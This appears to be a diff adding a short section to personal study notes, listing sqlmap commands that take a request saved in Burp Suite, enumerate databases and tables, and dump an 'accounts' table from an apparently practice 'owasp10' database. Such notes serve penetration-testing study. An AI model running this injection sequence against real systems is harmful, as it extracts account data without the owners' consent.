@@ -392,3 +392,10 @@
 
 + update
   apt update && apt dist-upgrade
+
++ sqlmap
+  use burpsuite to save GET packet as txt
+  sqlmap -r /Downloads/example.txt --dbs
+  0 or 1(choose injection point)
+  sqlmap -r /Downloads/example.txt -D owasp10 --tables(access table)
+  sqlmap -r /Downloads/example.txt -D owasp10 -T accounts --dump(access table's elements)
